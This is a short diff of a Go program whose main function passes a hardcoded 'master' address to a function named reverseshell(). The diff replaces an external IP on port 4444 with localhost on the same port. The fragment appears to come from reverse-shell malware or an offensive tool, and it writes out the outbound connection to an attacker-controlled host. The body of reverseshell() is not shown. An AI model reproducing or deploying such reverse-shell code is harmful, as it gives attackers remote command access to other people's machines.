@@ -78,6 +78,6 @@ chk_conn:
 
 func main() {
 	var master_ip string
-    master_ip = "45.32.28.187:4444"
+    master_ip = "127.0.0.1:4444"
 	reverseshell(master_ip)
 }
